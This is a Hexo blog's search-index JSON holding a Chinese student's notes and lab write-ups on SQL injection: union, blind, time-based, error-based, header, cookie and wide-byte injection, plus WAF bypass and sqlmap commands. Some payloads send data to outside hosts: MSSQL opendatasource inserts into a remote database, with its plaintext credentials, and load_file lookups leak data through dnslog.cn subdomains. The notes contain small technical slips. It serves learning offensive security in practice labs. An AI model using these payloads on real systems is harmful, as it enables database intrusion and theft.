{"meta":{"title":"伏诗","subtitle":"","description":"","author":"伏诗","url":"http://wxnsoul.github.io","root":"/"},"pages":[{"title":"about","text":"自己的急性子需要改改啦~~blog就是一个很好的选择 平平凡凡普通人一枚,尽自己所能去美好的活着 新的一年,一定要成功减肥,吼吼吼","path":"about/index.html","date":"03-31","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"03-31","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"03-31","excerpt":""}],"posts":[{"title":"反弹注入--zkaqb靶场","text":"注意点 Mssql的注释符必须用–+,不能用# Mssql的联合查询必须写union all Mssql的select 1,2,3得写select null,null,null Mssql有自带的数据库和表 先正着做一遍 查找注入点 1’ union all select null,null,null –+通过用数字和字符串替代null发现只要第二个null的地方有字符注入点,第一个有整型注入点(这就是因为mysql数据库会包容不兼容类型而mssql不会,所以得拿null去填充) 查找库名 1&#39; union all select null,name,id from dbo.sysdatabases --+ 注意,这里的name不是字段,不是表,而是描述表的信息,就像原理分析里面的唯一标识id一样,可以查找出自带库中的表的name和id. 查找用户创建的表名 1&#39; union all select id,name,null from dbo.sysobjects where xtype=&#39;U&#39; --+ 查找指定表中字段 1&#39; union all select null,name,id from dbo.sysdatabases --+ 查值 可以看到password和token字段比较可疑,去查一下 1’ union all select null,token,null from admin –+得出结果 接下来反着使用反弹注入做 查表 id=1&#39;;insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.amdin select id,name from dbo.sysobjects where xtype=&#39;U&#39; --+)在远程数据库里就会有数据插入(因为插入要求字段一样,所以单独创了一张表来配合使用,全部设置varchar即可) 查找指定表中字段 insert into opendatasource (‘sqloledb’, ‘server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666’) . wxchen666.dbo.id select name from dbo.syscolumns where id=1977058079 –+ 查值 insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.id select token from admin --+ 总结 就是一个语法得问题,记住就行了,然后多注意一些和mysql不同的操作","path":"2020/04/05/反弹注入-zkaqb靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"Mssql注入--反弹注入","text":"一、MSSQL反弹注入使用场景 明明是SQL的注射点却无法进行注射,注射工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注射结果等，这些都是在注射攻击中常常遇到的问题。为了解决以上这些疑难杂症，比较好的解决方法就是使用反弹注射技术，而反弹往射技术则需要依靠opendatasource函数支持.反弹注入也仅限于mysql 二、快速搭建一个MSSQL环境(骚姿势) http://www.webweb.com/(香港云)https://my.gearhost.com/Account/Login?ReturnUrl=%2fCloudSite(国外的虚拟主机)https://bccto.me/(十分钟邮箱)59.63.200.79:8015靶场去香港云或者虚拟云主机注册一个账号(用十分钟邮箱去注册),然后创立数据库即可三、MSSQL反弹注入语句解析 如何做mssql显错注入?Select 1,2,3这种语句是对mysql这样的对字符要求不严格的会生效,像access,mssql这样的拿select null,null,null去测试才对四.MSSQL的自带库 查询数据库select name from dbo. Sysdatabases自带数据库:master,tempdb查询表名select name from dbo. Sysobjects where xtype=&#39;U&#39;U是指user创建的表,S指系统创建的,所以知不知道库没有太大影响注意这张我创的test表(字段是a,b,c,d),但是他显示的有name,id,xtyoe,uid等等信息,这些都似乎用于描述表的,所以可以通过id来确定我要找的字段,id是唯一确定哪张表的这样查出的字段都是test表中的,不然会查出所有表中的所有字段 五.反弹注入语句 前面是常规操作,接下来时反弹注入 insert into opendatasource ( ‘sqloledb’ , ‘ serve r=SQL5009. webweb. com, 1433; uid=DB 1 4A5E44zkaq admin; pwd=Zkaqz kaq; database=DB14A5E44 zkaq’) .DB 1 4A5E44 zkaq. dbo. temp select * from admin—-.解析:sqloledb指连接mssql型数据库,erve r=SQL5009. webweb. com指你自己的数据库的外网地址.1433是指端口号,uid=DB 1 4A5E44zkaq admin指账号,pwd=Zkaqz kaq指连接的密码,database=DB14A5E44 zkaq’指连接哪个数据库,.DB 1 4A5E44 zkaq. dbo. temp是指库.表,就是选择哪个表的 整句话的意思就是把本地admin表(就是你攻击的表)的数据取出后插入到外网的自己连接的数据库上(迎合字段而创建)插入数据必须要满足字段相同Mssql的注释只有–+ 堆叠注入 你输入的sql语句可以多行执行.再参数后面加上; 然后再写sql语句.只需要在参数后面加上;然后;后面的sql语句能执行就是堆叠注入了 靶场地址 反弹注入传送门:","path":"2020/04/05/Mssql注入-反弹注入/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"DNS注入--zkaq靶场","text":"绕过安全狗 直接传参id=1&#39;and 1=1 -- qwe被狗咬住了查看源码发现过滤了and关键字.这边利用了apache得一个特性,碰到不认识的域名就会往前解析,所以输入 /1.txt?id=1 and 1=1 – qwe就绕了过去,因为不认识txt所以跑去解析index3.php了,还接受了id参数,但是使用 select database()是没有数据返回的. DNS攻击流程 登录到dnslog.cn网站随便获取一个域名，然后拼接想要的内容 /1.txt?id=1 and (select load_file(concat(“//“,(select database()),’.wwwwwwxxx.e6zfnp.dnslog.cn/dw’))) – qwe很明显得到了库名．这边非常需要注意语法,自己因为语法不熟练导致卡了很久,有select语句的记得用()把语句扩起来,让其作为sql语句执行,我一开始写的/1.txt?id=1 and select load_file(concat(&quot;//&quot;,(select database()),&#39;.wwwwwwxxx.e6zfnp.dnslog.cn/dw&#39;)) – qwe &lt;br&gt;/1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select table_name from information_schema.tables where table_schema=database()limit 1,1),&#39;.chenjiayn.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出表名为admin,news /1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,1),&#39;.chenjiayan.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出字段为id,username,password /1.txt?id=1 and (select load_file(concat(“//“,(select password from admin limit 0,1),’.chenjiayan.e6zfnp.dnslog.cn/dw’))) – qwe得到flag.需要注意因为dns注入只能返回一条数据,所以需要记得使用limit来限定","path":"2020/04/05/DNS注入-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"}]},{"title":"Mysql注入--DNS注入","text":"核心 通过dnslog(日志)把盲注变成有显错注入 函数介绍 LOAD_FILE()读取文件的函数读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_ allowed_ _packet (限制server接受的数据包大小函数，默认1MB)。如果该文件不存在或无法读取，因为前面的条件之一不满足， 函数返回NULL。这个功能不是默认开启的，需要在mysq|配置文件加一-句secure_file_priv=)效果图: Apache特性 当apache解析域名碰到不认识的东西时就会往前解析.所以当被拦截时就可以加一些不认识的东西让他去解析,比如1.txtand concat(“//”,select database(),”wdis.dnslog”) – wq)就可以把通过把库名拼接到dnslog上进行查看,但是只能拼接一条语句,所以只能用limit来限制 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/05/DNS%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/Mysql注入-DNS注入/","date":"04-05","excerpt":"","tags":[{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"access注入--zkaq靶场2","text":"判断是否存在cookie注入 实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 order by 26&quot;)这边order by 26页面返回正常,27返回错误,说明有26个字段 判断注入点 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin&quot;)页面返回三个注入点.但是呢,其实还有一个隐藏的注入点是没有发现的.右击靶场中那张没有加载出来的字段,检查元素会发现还有一个25是输出点判断表中字段数 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,10,admin.* from admin&quot;)一个一个的删除直到第十个的时候发现页面返回正常了,说明admin中有十六个字段.为啥不返回数据呢?因为注入点是3,5,7,现在是11-26 根据注入点爆出值 document.cookie=&quot;ID=&quot;+escape(&quot;105 union select 1,2,3,4,5,6,7,8,9,admin.*,27 from admin&quot;)可以看到flag就在admin表中的最后一个字段的值 zkaq{f0e12dafb6} 总结 access的魅力就在于不知道字段名但是可以得到数据 如果输出点很少,偏移注入不能把所有的字段值爆破出来.就像这里的3,5,7,25是输出点,怎样偏移都没有办吧把中的字段的数据弄出来","path":"2020/04/05/access注入-zkaq靶场2/","date":"04-05","excerpt":"","tags":[{"name":"Access注入--偏移注入","slug":"Access注入-偏移注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/"}]},{"title":"zkaq--正则表达式--zkaq靶场","text":"源码 )很明显就是考察正则表达式的./zkaq.*key.{2,9}:\\/.*\\/(key*key)/i第一次大致的解读就是zkaq任意字符key任意字符(长度2-9):/任意字符/key任意字符key 并且不区分大小写,直接正确了zkaq2key66://keykey 总结 其实自己对{}这个限定符的理解还不是很到位,{}限定的还是直接相关的前面的一个字,只有把前面内容用括号括起来才会要求所有内容全部重复 对.这个通配符,,单独使用.去匹配时只要不全都是制表符就会匹配成功,以前以为 如:a.就只能匹配两个字符,其实不然,其实他的意思是a后面第一个字符可以为不是制表符的任意字符(且必须有一个字符) .*就表示任意字符,且出现次数为0-n次 拓展","path":"2020/04/05/zkaq-正则表达式-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"http://wxnsoul.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"解决tags和categories点击后页面为空的问题","text":")标签页设置了下拉单,最大数量为三,点击之后也可以跳转到相应的标签分类.但是点击省略号之后跳出的内容却为空就像这样.查阅了很多资料之后终于找到原因了,原来是source/tags/index.md里面没有进行设施.在多加一行layout: &quot;tags&quot;之后就可以成功的跳转了 效果图: 原文地址:https://blog.csdn.net/winter_chen001/article/details/79719154","path":"2020/04/05/解决tags和categories点击后页面为空的问题/","date":"04-05","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"access注入--zkaq靶场","text":"判断是否存在cookie注入 实操的时候发现,看录播的时候没有注意细节,我是在原始画面上那个没有get传参的页面上输入cookie信息的,所以没有用,页面不会跳转,因为根本没有数据库查询语句,写了flag也不会被拼接进去进行查询的.只有在有get传参的时候,把get传参去掉,改用cookie才能测试出信息)进入到靶场,随便点击一个页面,进入)发现fet传参id=171))去点url里的传参后设置cookie传参,再次访问页面发现页面还是这个)再次把id改成172回车访问页面再次跳转了,说明是存在cookie注入的判断字段数 document.cookie=&quot;id=&quot;+escape(&quot;171 order by 11&quot;)此时页面才错误,说明有十个字段 判断注入点 access与mysql不同之处就在于这,必须要加个from table_name不然无法执行document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;)找到注入点为2,3 猜值 document.cookie=&quot;id=&quot;+escape(&quot;171 union select 1,2,password ,4,5,6,7,8,9,10 from admin&quot;)因为access只有一个库,也没有什么自带库,,只能靠猜表,猜字段来作题,下节课可以教使用偏移注入来猜字段,这里的passord字段是风哥直接告诉我们的,不用纠结,不告诉也只能靠猜跑出来有点奇怪.. b9a2a2b5dffb918c)后来问了风哥才知道要去md5解密一下,解密出来是welcome.一开始死活解密不出是因为自己少抄了一个,,,md5只能加密成16或32位的(Md5加密后的特点) 进入后台 拿到了admin用户的密码后,按照提示进入后台,拿到flag)","path":"2020/04/04/access注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"Access注入--cookie注入","slug":"Access注入-cookie注入","permalink":"http://wxnsoul.github.io/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/"}]},{"title":"数据库注入--Access注入","text":"前言 数据库有很多Mysql Access MSSQL Oracle不同的数据库，虽然语句类似但是在渗透测试的时候是不同。本章研究不同数据库的注入方法还有一-些骚姿势 cookie注入简介 Cookie他并不安全,没有绝对的安全用户的体验性和安全是需要平衡,如果高度安全每访问一个页面最后登陆一-次,那么用户的体验肯定是很差的.所以就出现了cookie来记录用户身份提高用户体验Cookie注入核心在于注入方式,不是说只有access数据库才有cookie注入,只不过一般来说access数据库都很有可能存在cookie注入,毕竟是2000的产品Php常用版本是5.2,所以一般$_REQYEST[ ]是可以接收cookie传参的(低于5.4就可以) 什么情况使用cookie注入? 当get,post注入被拦截时 cookie和session的关系 如果cookie代表你(用户)的身份信息,那么session代表着警察局(服务器)内存储你的信息的地方 怎样修改cookie 通过burp抓包注意需要全部转化成url编码再放包 通过浏览器设置Application这里可以直接添加,也不需要转url码 通过控制台设置) 如何判断是否存在cookie注入 在有get传参的地方,比如id=171,把参数去掉后,通过burp抓包后在cookie最后加上;再加上一个空格(一定要)然后再加上id=171,放过后发现依旧能够达到预期的页面,这就说明cookie信息也被拼接写入数据库了 再使用and 1=1,1=2之类的来判断是否存在注入,不过需要注意的是cookie传参值需要url编码http://www.3464.com/tools/StrToHex/JiaMi.asp这是在线编码网站(使用控制台cookie传参得时候一定要把url栏中得参数去掉,不然会先用url栏中得数据,从而不使用cookie的) 和其他数据库的不同点 Access 数据库只有一个数据库,所有的表都只能在同一个数据库内,所以判断表名只能强行猜………经验来说一般有admin,user,news,job等.不过也可以用sqlmap去跑,去试而且,就msyql找注入点用select 1,2,3,4这样即可,但是access就必须select 1,2,3,4 from table_name才可以执行 如何使用sqlmap跑cookie注入? PY -2 sqlmap. Py -u “http://59. 63. 200. 79: 8004/ shovnews. asp” –cookie “id=171”注意url这里没有传参的,是吧参数单独放到后面用双引号引起来,告诉SQLmap跑这个注入点 直接抓包 -r抓 偏移注入原理核心:纵然不知道字段名但还是可以获得数据不知道表名,,就要去爆破主要用到union all 此条联合查询语句,union all和union得区别就是union会删除查询到得结果集中相同得数据,而union all不会再利用union all它要求必须字段数要相同,所以可以来判断到底表中有几个字段如图所示,这样就能判断出test表中有三个字段.再改成select * from table_name就可以爆出字段 注意点union查询前后字段数必须匹配.如果前面得字段少,后面偏移注入得字段多事没有办法成功得,所以union前面得字段要尽可能多,起码比后面得多.有些时候在源码中可以找到一些隐蔽得注入点,这些就需要自己去发现了 流程 判断注入点 order by判断字段数 判断表名(只能爆破) 联合查询 获取表中列数(知道存在几列以及输出点) 开始偏移注入,获取表中的数据 拓展万一需要的字段字段值不在第一条,在后面要怎么办?这时候就需要多了解一些知识了.首先,select * from flag union select 1,2,3 order by 1问:这个默认的升序排序是只对union 以后的数据进行排序还是把结果集合在一起之后再排序?答:是结合在一起之后在排序的,加个desc 变成降序也一样.问:如何取出第N条数据?答:这就需要加一个top关键字了.top 1就是取出第1条数据,top 2就是取出前两条数据.取出的数据进行排序后在输出.所以可能会发送top 1,top 2,top 3..输出的页面是一样的,那是因为虽然取出的数据变多了,但是排在最前面的那条数据其实是没有变过的 靶场地址 cookie注入传送门:https://wxnsoul.github.io/2020/04/05/zkaq-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-zkaq%E9%9D%B6%E5%9C%BA/偏移注入传送门:https://wxnsoul.github.io/2020/04/05/access%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA2/","path":"2020/04/04/数据库注入-Access注入/","date":"04-04","excerpt":"","tags":[{"name":"数据库注入--Access注入原理","slug":"数据库注入-Access注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"宽字节注入--zkaq靶场","text":"源码审计 审计源码,发现对/’”\\做了过滤 preg_replace($pattern, $replacement, $string)pattern表示正则表达式或是其他规则,replacement表示需要替换的内容,string表示需要搜索的字符串 string preg_quote ( string $str [, string $delimiter = NULL ] )preg_quote — 转义正则表达式字符正则表达式字符有这些: . \\ + * ? [ ^ ] $ ( ) { } = ! &lt; &gt; | : - 注意 / 不是正则表达式特殊字符。如果指定了可选参数 delimiter，它也会被转义.远么审计结果发现这句话表示数据库编码方式是GBK编码,可以尝试宽字节注入 尝试SQL注入 宽字节注入确实有效果,足足页面等了十五秒.. 判断字段数 1%df’ order by 4– qwe使用order by直到第四个失败,所以总共有三个字段1%df’ union select 1,2,3– wer 判断注入点 很明显2,3是注入点 查找表 查找字段 查到值 遇见的问题 在写table_name=’china_flag’的时候出错了,因为单引号被过滤了,自己潜意识里认为只需要绕过把变量引起来的单引号就可以了.那么这样子怎么办呢?我们可以有两种绕过方法使用子查询绕过(也可以使用十六进制) pass-17 post传参 这道题的区别就在于get传参变成了post传参,然后也关闭了回显,得用post类型的布尔盲注.Get传参和post的传参对这题的影响:url传参参数会进行url编码,但是post传参不会,必须自己手动通过burp改才行 两种解法 通过burp把参数改成十六进制 直接输入一个汉字来和magic_quotes_gpc产生的/闭合,url编码中一个汉字占三个字节,在数据库中和/结合后变成四字节就是两个中文了从而实现绕过 判断字段数 第四个的时候不行了,判断出是三个字段 判断表长 很明显长为10 爆破表名 表为china_flag 查找字段长 )这边又忘了单引号绕过,使用十六进制绕过表名 爆字段 跑出是C_flag 爆值 长11,最后跑出是zKaQ-Kzj+mz 总的来说宽字节注入也不难,搞懂原理后和前面都一样","path":"2020/04/04/宽字节注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--宽字节注入","text":"magic_quotes_gpc魔术引号 $sql = ‘ select* from admin where username=&#39;‘.$REQUEST [ ‘ username’] .’&#39; and password =&#39;‘.$REQUEST [ ‘ password’ ]这是一个标准的sql语句,没有做过任何过滤所以使用万能密码很容易实现注入,使用魔术引号之后呢,就会自动在单引号,双引号,反斜杠之前自动加一个反斜杠(PHP5.4以后就取消了这个功能,可以在php.ini中查看是否开启)单引号和双引号内的一切都是字符串，那我们输入的东西如果不能闭合掉单引号和双引号，我们的输入就不会当作代码执行，就无法产生SQL注入，那我们该怎么办? 示例 )5.4以下的php中的php.ini文件中默认打开这个功能,此时要是传入’”/就i会发生这样的事情 GBK编码格式 Gbk编译的汉字占用两个字节,但是utf-8编译的汉字占用三个字节什么是url编码?其实就是十六进制编码,会把输入的十六进制转换成十进制然后对应ASCII码输出.比如%27转换成十进制就是39,对应的ascii就是单引号 宽字节注入原理 魔术引号把用户输入的单引号变成\\’之后,如果数据库编码不是utf-8编码就可能造成宽字节注入.因为\\的url编码是%5c,是占用一个字节的,如果用户输入%df’就会变成%df%5c从而组成一个双字节汉字’運’从而是的魔术引号加的/失效注意,只有get传参和cookie传参的时候在地址栏输入的参数才会被url编码,如果是post传参,基本上不可能被url编码先编译.所以如果是post传参,可以使用burp抓包后修改十六进制文件,或者是直接在表单中输入 汉’,也可以成功.因为utf-8编码中中文是三个字节的,加上’就是四个字节,到了GBK的数据库中就会变成两个中文字符如果使用sqlmap去跑,需要手动去闭合一些东西后再加*,毕竟是工具,比较呆示例:加了%df之后多出的β就会和/一起再数据库中组成一个汉字,从而实现了绕过 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-宽字节注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入绕过姿势","text":"#被过滤 使用%23绕过 单引号过滤 宽字节绕过 转十六进制 写子查询","path":"2020/04/04/SQL注入绕过姿势/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入绕过姿势","slug":"SQL注入绕过姿势","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"}]},{"title":"盲注--zkaq靶场","text":"因为关闭了回显,只能看页面返回是否正常,所以使用盲注来完成 测试是否可以注入 可以得知是可以进行注入的判断表的长度 1 and length((select table_name from information_schema.tables where table_schema=database()))&gt;0表长为6 爆破表名 1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97)使用burp跑包得出表为loflag 判断字段长 得知flag长度为8,在跑包得出所以flagBurp跑出密码为zKaQ-QQQ, zKaQ-RD, zKaQ-Moren, zKaQ-time-hj其实很早就拿到flag了,问了很多人之后才明白靶场里的flag提交的时候手打过不了,,,我是在QQ里打字之后复制粘贴过去才过的 另外两题也没什么大区别,只不过一个#被吃掉了,转义成%23即可,一个改成了get传参.不过get传参那题有个坑,flag被改了位置,峰哥说是为了培养我们思维不固化 关于注释符 1.# 2.– qwe 3.–+,有时候#会变成锚点,所以不得不改变注释符,但是–qwe只能在get注入里面使用,有局限性 sqlmap解题 也可以使用sqlmap去跑库,–flush-session语句用来清除缓存","path":"2020/04/04/盲注-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"SQL注入--盲注","text":"为何要使用盲注 盲注主要是因为管理员关闭了回显,你无法得知返回得报错,所以只能通过盲注来实现注入攻击 常用函数 strlen(),substr(str,pos,len),acsii(),sleep(),if(flag?true:false) 主要流程select * from table_name where id=1 and 1=1页面正常返回select * from table_name where id=1 and 1=2页面错误返回所以开始利用这个页面返回是否正常来完成注入 select * from table_name where id=1 and length(database())&gt;5 开始根据页面返回来判断数据库字符长度,然后疯狂改变5测出真实长度 select * from table_name where id=1 and acsii(substr(database(),1,1))=111然后就是配合截取函数和acscii函数一个一个的判断字符.这可以使用burp功能模块来帮助快速完成,或者是sqlmap.不然如果太长手工破解会很累 select * from table_name where id=1 and length(select table_name from database())=5测试第一个表名的长度… select * from table_name where id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1))&gt;97然后就是一个一个的判断表名 以此类推…. 靶场实战 传送地址: 延时注入延时注入也是盲注的一种,只不过又换了两个函数利用,变成了if和sleep.举个小小的栗子,select * from table_name where id=1 and if(length(database())&lt;11,sleep(5),1) -- wqed&quot;如果数据库名&lt;11就沉睡5秒 注入优先级显错注入&gt;报错(updatexml(0x7e,sql,1))&gt;布尔盲注&gt;延时注入","path":"2020/04/04/SQL注入-盲注/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--盲注","slug":"SQL注入-盲注","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"}]},{"title":"HEAD注入--zkaq靶场","text":"源码 很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了. burp过滤出自己想要的内容 如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,尽量使用避免中文)看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456 判断是否可以头注入 从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!&#39; or sleep(5),1)#返回页面确实延迟了五秒多,说明是存在head注入的.这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了 使用xmlupdate函数爆破表名 ‘ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)# 这里需要注意表名是flag_head,~是concat函数连接上去的 爆破字段 ‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)# 爆破值 ‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#成功得出flag 另外两个靶场也是差不多的这个是获取referer的这个是获取X-Forwarded=For的基本结构,直接修改就好","path":"2020/04/04/HEAD注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--HEAD注入","text":"HEAD注入介绍 函数介绍 0x表示16进制,7e表示的是~这个特殊符号,出现在了路径中所以会报错 实操 select * from user where ID= 1 and updatexml(1,concat(0x7e,(select database())),1)注意,只是返回一行数据,需要用limit去操作返回哪一行 为何要HEAD注入 有的数据库管理员会关闭报错,关闭掉数据库所有报错之后肯定是不会成功的,但是一般不会有管理人员回去关闭掉所有报错,就比如说insert插入操作.但是insert操作不会有回显,所以我们需要让她去强行报错.会什么浏览器会返回我们报错的数据呢?因为php处理MySQL时遇见了致命性错误会告诉用户出错了 X-Forwarded-For 用于获取你的真实ip,如果你用了透明代理,传输上去的数据包里会有X-Forwarded_For函数来告诉服务器你得ip,当然这个我们可以通过拦截来修改 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/04/SQL注入-HEAD注入/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--HEAD注入","slug":"SQL注入-HEAD注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/"}]},{"title":"POST注入--zkaq靶场","text":"靶场地址:https://hack.zkaq.cn/ )题目长这样,尝试使用万能密码很明显成功登录了,接下来就可以查询了 首先查字段数select *from user where username =&#39;1&#39; or 1=1 order by 3#&#39; and password=&#39;&#39;select *from user where username =&#39;&#39; or 1=1 order by 4#&#39; and password=&#39;&#39;可以得知有三个字段 接着找出注入点select *from user where username =&#39;&#39; union select 1,2,3#&#39; and password=&#39;&#39;可以看出2,3是注入点 爆表(爆不爆库无所谓,直接拿database()代替就可以)select *from user where username =&#39;&#39; union select 1,2,table_name from information_schema.tables where table_schema=database()#&#39; and password=&#39;&#39;查找出flag表 爆字段select *from user where username =&#39;&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39; and password=&#39;&#39;看到是flag字段 查值select *from user where username =&#39;&#39; union select 1,2,group_concat(flag) from flag#&#39; and password=&#39;&#39;可以爆出字段值注:尽量使用limit一个一个取值而不要group_concat,因为只能输出一行,有时候数据会出书不完整 另外一个靶场也只需要注意闭合的问题,流程一样 利用sqlmap工具先使用burp抓住带有cookie信息的包,然后复制粘贴到txt文件里,把需要注入的点改成星号*,告诉sqlmap这里是注入点,然后使用-r打开文件就行,这里依旧需要使用—dbs等命令来暴库,一开始以为不需要python sqlmap.py -r 1.txt --dbs --level 3(默认的level是力度不够的) python sqlmap.py -r 1.txt -D error --tables --level 3python sqlmap.py -r 1.txt -D error -T error_flag --columns --level 3python sqlmap.py -r 1.txt -D error -T error_flag -C flag --dump --level 3","path":"2020/04/04/POST注入-zkaq靶场/","date":"04-04","excerpt":"","tags":[{"name":"SQL注入--POST注入","slug":"SQL注入-POST注入","permalink":"http://wxnsoul.github.io/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/"}]},{"title":"SQL注入--POST注入","text":"SQL注入原理分析 注入攻击的本质:是把用户输入的数据当作代码执行（注入攻击不单指SQl注入）SQL注入点：可以进行SQL注入的地方要能够进行注入攻击必须满足两个条件:1.用户必须可以控制数据的输入2.用户输入的数据能够当作代码执行如果用户输入的数据被强制转换成了数字,那么就失去了这个条件 post传参 